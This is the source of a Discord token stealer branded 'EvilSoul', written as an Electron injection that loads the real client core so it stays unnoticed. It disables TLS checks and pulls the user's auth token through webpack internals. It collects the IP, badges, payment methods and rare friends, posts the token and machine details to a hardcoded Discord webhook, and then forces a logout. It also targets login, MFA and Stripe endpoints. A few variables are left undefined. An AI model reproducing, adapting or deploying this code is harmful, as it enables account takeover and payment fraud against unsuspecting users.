process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;

const fs = require("fs");
const electron = require("electron");
const https = require("https");
const queryString = require("querystring");

var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`

let config = {
 webhook: "https://canary.discord.com/api/webhooks/1365804617744777279/ovBDwu1u3VSrD1H4x46qfuoNfpL8LAw8lI0DWfugeJBwbVrJYymafLiCPm137yMptnag",
 "logout": "true",
 "logout-notify": "true",
 "init-notify": "true",
 "disable_qrcode": "true",
 get: {
  token: `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  logout: `function getLocalStoragePropertyDescriptor() {const o = document.createElement("iframe");document.head.append(o);const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");return o.remove(), e};Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());const localStorage = getLocalStoragePropertyDescriptor().get.call(window);console.log(localStorage.token);if(localStorage.token) {localStorage.token = null,localStorage.tokens = null,localStorage.MultiAccountStore = null,location.reload();} else {return"This is an intentional error";}`,
 },
 filters: {
  urls: [
   "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
   "https://*.discord.com/api/v*/applications/detectable",
   "https://discord.com/api/v*/applications/detectable",
   "https://*.discord.com/api/v*/users/@me/library",
   "https://discord.com/api/v*/users/@me/library",
   "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
   "https://discord.com/api/v*/users/@me/billing/subscriptions",
   "wss://remote-auth-gateway.discord.gg/*",
  ],
 },
 completed: {
  urls: [
   "https://discord.com/api/v*/users/@me",
   "https://discordapp.com/api/v*/users/@me",
   "https://*.discord.com/api/v*/users/@me",
   "https://discordapp.com/api/v*/auth/login",
   "https://discord.com/api/v*/auth/login",
   "https://*.discord.com/api/v*/auth/login",
   "https://api.stripe.com/v*/tokens",
   "https://discord.com/api/v*/auth/mfa/totp",
   "https://discordapp.com/api/v*/auth/mfa/totp",
   "https://*.discord.com/api/v*/auth/mfa/totp",
   "https://discord.com/api/v*/users/@me/mfa/totp/enable",
  ],
 },
};

const badges = {
 staff: {
  emoji: "<:staff:1362105228719034679>",
  id: 1 << 0,
  rare: true,
 },

 active_developer: {
  emoji: "<:activedev:1362104965065212074>",
  id: 1 << 22,
  rare: false,
 },

 early_supporter: {
  emoji: "<:pig:1362105166811103515>",
  id: 1 << 9,
  rare: true,
 },

 verified_developer: {
  emoji: "<:dev:1362105068060676329>",
  id: 1 << 17,
  rare: true,
 },

 certified_moderator: {
  emoji: "<:mod:1362105108170539229>",
  id: 1 << 18,
  rare: true,
 },

 bug_hunter_level_1: {
  emoji: "<:bughunter1:1362105034157981758>",
  id: 1 << 3,
  rare: true,
 },

 bug_hunter_level_2: {
  emoji: "<:bughunter2:1362105047462314293>",
  id: 1 << 14,
  rare: true,
 },

 partner: {
  emoji: "<:partner:1362105185094336622>",
  id: 1 << 1,
  rare: true,
 },

 hypesquad_house_1: {
  emoji: "<:bravery:1362105004089147784>",
  id: 1 << 6,
  rare: false,
 },

 hypesquad_house_2: {
  emoji: "<:brilliance:1362105019066748968>",
  id: 1 << 7,
  rare: false,
 },

 hypesquad_house_3: {
  emoji: "<:balance:1362104986330202172>",
  id: 1 << 8,
  rare: false,
 },

 hypesquad: {
  emoji: "<:events:1362105087006212456>",
  id: 1 << 2,
  rare: true,
 },

 nitro: {
  emoji: "<a:nitro:1362115714185691186>",
  rare: false,
 },

 nitro_bronze: {
  emoji: "<:bronze:1365454925357645994>",
  rare: false,
 },

 nitro_silver: {
  emoji: "<:silver:1365454972962996254>",
  rare: false,
 },

 nitro_gold: {
  emoji: "<:gold:1365454994337435739>",
  rare: false,
 },

 nitro_platinum: {
  emoji: "<:platinum:1365455020690243737>",
  rare: false,
 },

 nitro_diamond: {
  emoji: "<:diamond:1365455075937488967>",
  rare: false,
 },

 nitro_emerald: {
  emoji: "<:emerald:1365455096296509524>",
  rare: false,
 },

 nitro_ruby: {
  emoji: "<:ruby:1365455125187137536>",
  rare: false,
 },

 nitro_opal: {
  emoji: "<:opal:1365455150260551740>",
  rare: false,
 },

 guild_booster_lvl1: {
  emoji: "<:boost1:1362104840250986667>",
  rare: false,
 },

 guild_booster_lvl2: {
  emoji: "<:boost2:1362104851575607636>",
  rare: false,
 },

 guild_booster_lvl3: {
  emoji: "<:boost3:1362104863084904830>",
  rare: false,
 },

 guild_booster_lvl4: {
  emoji: "<:boost4:1362104873600024857>",
  rare: true,
 },

 guild_booster_lvl5: {
  emoji: "<:boost5:1362104892226928812>",
  rare: true,
 },

 guild_booster_lvl6: {
  emoji: "<:boost6:1362104904348467431>",
  rare: true,
 },

 guild_booster_lvl7: {
  emoji: "<:boost7:1362104916247707658>",
  rare: true,
 },

 guild_booster_lvl8: {
  emoji: "<:boost8:1362104931745530197>",
  rare: true,
 },

 guild_booster_lvl9: {
  emoji: "<:boost9:1362104950938796164>",
  rare: true,
 },

 quest_completed: {
  emoji: "<:quest:1362105209496801290>",
  rare: false,
 },
};

let contents = [];
async function ExecScript(str) {
 const window = electron.BrowserWindow.getAllWindows()[0];
 const script = await window.webContents.executeJavaScript(str, true);
 return script || null;
}

async function GetUrl(url, token) {
 const data = await ExecScript(`
  var xmlHttp = new XMLHttpRequest();
  xmlHttp.open( "GET", "${url}", false );
  xmlHttp.setRequestHeader("Authorization", "${token}");
  xmlHttp.send( null );
  JSON.parse(xmlHttp.responseText);`);
 return data;
};

async function GetIp() {
 const data = await ExecScript(`var xmlHttp = new XMLHttpRequest();\nxmlHttp.open( "GET", "https://www.myexternalip.com/json", false );\nxmlHttp.send( null );\nJSON.parse(xmlHttp.responseText);`);
 return data.ip;
};

function GetRareBadges(flags) {
 if (typeof flags !== "number") return "";
 let result = "";
 for (const id in badges) {
  const badge = badges[id];
  if ((flags & badge.id) === badge.id && badge.rare) {
   result += badge.emoji;
  }
 }
 return result;
}

function GetA2F(bouki) {
 switch (bouki) {
  case true:
   return "`Enable`";
  case false:
   return "`No Enable`";
  default:
   return "WTF DONT HAVES MFA OR HAVES?????";
 }
};

async function CurrentNitro(since) {
 if (!since) {
  return { badge: null, current: null };
 }

 const currentDate = new Date();
 const sinceDate = new Date(since);

 const year = currentDate.getFullYear() - sinceDate.getFullYear();
 const month = currentDate.getMonth() - sinceDate.getMonth();
 let passed = year * 12 + month;
 if (currentDate.getDate() < sinceDate.getDate()) {
  passed -= 1;
 }

 const nitros = [
  { badge: "nitro", lowerLimit: 0, upperLimit: 0 },
  { badge: "nitro_bronze", lowerLimit: 1, upperLimit: 2 },
  { badge: "nitro_silver", lowerLimit: 3, upperLimit: 5 },
  { badge: "nitro_gold", lowerLimit: 6, upperLimit: 11 },
  { badge: "nitro_platinum", lowerLimit: 12, upperLimit: 23 },
  { badge: "nitro_diamond", lowerLimit: 24, upperLimit: 35 },
  { badge: "nitro_emerald", lowerLimit: 36, upperLimit: 59 },
  { badge: "nitro_ruby", lowerLimit: 60, upperLimit: 71 },
  { badge: "nitro_opal", lowerLimit: 72 },
 ];

 const current = nitros.find((badge) => {
  const inLowerLimit = passed >= badge.lowerLimit;
  const inUpperLimit = typeof badge.upperLimit === "undefined" || passed <= badge.upperLimit;
  return inLowerLimit && inUpperLimit;
 });

 return { badge: current?.badge || null, current: since };
}

async function GetBadges(id, token) {
 const data = await GetUrl("https://discord.com/api/v9/users/" + id + "/profile", token);
 if (!data || !Array.isArray(data.badges)) return "`None`";
 if (!data.badges.length) return "`No Badges`";
 const flags = data.badges.map((badge) => badge.id);
 const nitro = await CurrentNitro(data.premium_since);
 if (nitro.badge) {
  flags.unshift(nitro.badge);
 }

 return flags.length ? flags.map((id) => badges[id]?.emoji).filter(Boolean).join("") : "`No Badges`";
}

async function GetBilling(token) {
 const data = await GetUrl("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
 if (!data || !Array.isArray(data)) return "`None`";
 if (!data.length) return "`No Billing`";

 let billings = "";
 for (const billing of data) {
  if (billing.type == 2 && billing.invalid != !0) {
   billings += "<:paypal:1367518269719969873>";
  } else if (billing.type == 1 && billing.invalid != !0) {
   billings += "<:card:1367518257241915483>";
  }
 }

 return billings || "`No Billing`";
}

async function GetFriends(token) {
 const data = await GetUrl("https://discord.com/api/v9/users/@me/relationships", token)
 if (!data || !Array.isArray(data)) return "*Account Locked*";
 if (!data.length) return "*No Rare Friends*";

 const friends = data.filter((user) => user.type == 1);
 let result = "";
 for (const friend of friends) {
  const badges = GetRareBadges(friend.user.public_flags);
  const friend3c = friend.user.username.length === 3;
  const badge3c = friend3c ? "<:3c:1365004856103796897>" : "";
  if (badges) {
   result += `${badge3c}${badges} | \`${friend.user.username}\`\n`;
  } else if (friend3c) {
   result += `${badge3c} | \`${friend.user.username}\`\n`;
  }
 }

 return {
  length: friends.length,
  users: result || "*No Rare Friends*",
 };
}

async function SendWebhook(webhook, content) {
 const data = JSON.stringify(content);
 const parts = new URL(webhook);
 const options = {
  hostname: parts.hostname,
  path: parts.pathname,
  method: "POST",
  headers: {
   "Content-Type": "application/json",
   "Content-Length": data.length,
  },
 };

 const request = https.request(options, (response) => {
  let result = "";
  response.on("data", (chunk) => {
   result += chunk;
  });

  response.on("end", () => {
   console.log(result);
  });
 });

 request.on("error", (err) => {
  console.error(err);
 });

 request.write(data);
 request.end();
}

const path = (function () {
 let appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/");
 appPath.pop();
 appPath = appPath.join("/");
 let appName = electron.app.getName();
 return { appPath, appName };
})();

async function Init() {
 const ip = await GetIp();
 const token = await ExecScript(tokenScript);
 const user = await GetUrl("https://discord.com/api/v8/users/@me", token);
 const avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`;
 if (config["init-notify"] !== "true") {
  return true;
 }

 if (!fs.existsSync(__dirname + "/evilsoul")) {
  fs.mkdirSync(__dirname + "/evilsoul");
 } else {
  return true;
 }

 const { appName } = path;
 const embed = {
  color: 0x2b2d31,
  fields: [
   {
    name: "Token:",
    value: "```" + token + "```",
    inline: false,
   },
   {
    name: "Client:",
    value: "`" + appName + "`",
    inline: true,
   },
   {
    name: "Computer Name:",
    value: "`" + computerName + "`",
    inline: true,
   },
   {
    name: "IP:",
    value: "`" + ip + "`",
    inline: true,
   },
   {
    name: "Injection Path:",
    value: "```" + __dirname + "```",
    inline: false,
   },
  ],
  author: {
   name: `${user.username} (${user.id})`,
   icon_url: avatar,
  },
  footer: {
   icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
   text: "EvilSoul | t.me/EvilSoulStealer",
  },
 };

 const payload = {
  embeds: [embed],
  username: "Injections - EvilSoul",
  avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
 };

 SendWebhook(webhook, payload);
 await ExecScript(logOutScript);
}

Init();

module.exports = require("./core.asar");
